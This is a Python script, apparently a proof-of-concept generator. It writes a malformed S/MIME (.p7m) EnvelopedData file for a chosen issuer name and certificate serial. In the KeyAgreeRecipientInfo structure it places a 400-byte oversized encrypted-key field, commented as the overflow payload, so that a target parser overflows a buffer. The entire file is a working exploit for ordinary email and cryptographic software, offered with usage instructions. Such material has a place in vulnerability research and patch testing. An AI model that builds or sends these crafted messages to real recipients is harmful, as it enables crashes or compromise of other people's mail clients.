import sys
from asn1crypto import core, x509

# --- ASN.1 HELPER FUNCTIONS ---
def encode_len(length):
    if length < 0x80:
        return bytes([length])
    else:
        len_bytes = length.to_bytes((length.bit_length() + 7) // 8, 'big')
        return bytes([0x80 | len(len_bytes)]) + len_bytes

def der_tlv(tag, content):
    return bytes([tag]) + encode_len(len(content)) + content

def der_seq(chunks):
    return der_tlv(0x30, b''.join(chunks))

def der_set(chunks):
    return der_tlv(0x31, b''.join(chunks))

def der_octet_string(data):
    return der_tlv(0x04, data)

def der_bitstring(data):
    # Prefix 0x00 for unused bits
    return der_tlv(0x03, b'\x00' + data)

# --- POC GENERATOR ---
def generate_poc(output_filename, issuer_cn, serial_input):
    # Handle Serial Number (Hex String or Integer)
    try:
        if isinstance(serial_input, str):
            # Clean up hex prefix if present
            clean_serial = serial_input.lower().replace("0x", "")
            # Convert base-16 to int
            serial_int = int(clean_serial, 16)
        else:
            serial_int = int(serial_input)
    except ValueError:
        print(f"[!] Error: Invalid serial number '{serial_input}'")
        sys.exit(1)

    print(f"[*] Generating PoC S/MIME message")
    print(f"    Target: {issuer_cn}")
    print(f"    Serial (Hex): {serial_int:X}")
    print(f"    Serial (Int): {serial_int}")

    # 1. The Payload (Overflow)
    oversized_key = b'A' * 400
    
    # Dummy P-256 Public Key
    dummy_key = b'\x04' + b'\x41' * 64

    # 2. Helpers
    def get_oid(oid_str): return core.ObjectIdentifier(oid_str).dump()
    def get_int(val): return core.Integer(val).dump()
    
    # OIDs
    oid_env_data   = get_oid('1.2.840.113549.1.7.3')
    oid_data       = get_oid('1.2.840.113549.1.7.1')
    oid_ecc_kem    = get_oid('1.3.132.1.11.1')         
    oid_aes128_cbc = get_oid('2.16.840.1.101.3.4.1.2') 
    oid_ec_pub     = get_oid('1.2.840.10045.2.1')      
    oid_secp256    = get_oid('1.2.840.10045.3.1.7')    

    # 3. Structure Assembly

    # --- Originator Field ---
    algo_ec = der_seq([oid_ec_pub, oid_secp256])
    originator_pub_key = algo_ec + der_bitstring(dummy_key)
    
    # [1] IMPLICIT OriginatorPublicKey -> [0] EXPLICIT
    originator_choice = der_tlv(0xA1, originator_pub_key)
    originator_field = der_tlv(0xA0, originator_choice)

    # --- Recipient Field ---
    name_bytes = x509.Name.build({'common_name': issuer_cn}).dump()
    rid = der_seq([name_bytes, get_int(serial_int)])
    
    # RecipientEncryptedKey
    recip_enc_key = der_seq([
        rid,
        der_octet_string(oversized_key) # <--- OVERFLOW PAYLOAD
    ])

    # KeyAgreeRecipientInfo
    kari_content = b''.join([
        get_int(3),           # Version 3
        originator_field,     # Originator
        der_seq([oid_ecc_kem, core.Null().dump()]), # KeyEncAlgo
        der_seq([recip_enc_key]) # RecipientEncryptedKeys
    ])
    kari_tagged = der_tlv(0xA1, kari_content) # [1] IMPLICIT KeyAgreeRecipientInfo

    # EnvelopedData
    iv = der_octet_string(b'\x00' * 16)
    content_enc_algo = der_seq([oid_aes128_cbc, iv])

    env_data = der_seq([
        get_int(2), # Version
        der_set([kari_tagged]), # RecipientInfos
        der_seq([ # EncryptedContentInfo
            oid_data,
            content_enc_algo, 
            der_tlv(0x80, b'secret') # [0] IMPLICIT Content
        ])
    ])

    # Root
    content_info = der_seq([
        oid_env_data,
        der_tlv(0xA0, env_data)
    ])

    with open(output_filename, 'wb') as f:
        f.write(content_info)
    
    print(f"[+] Successfully created '{output_filename}'")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python poc_gen.py <output.p7m> <Issuer CN> <Serial Hex/Int>")
        sys.exit(1)
    generate_poc(sys.argv[1], sys.argv[2], sys.argv[3])
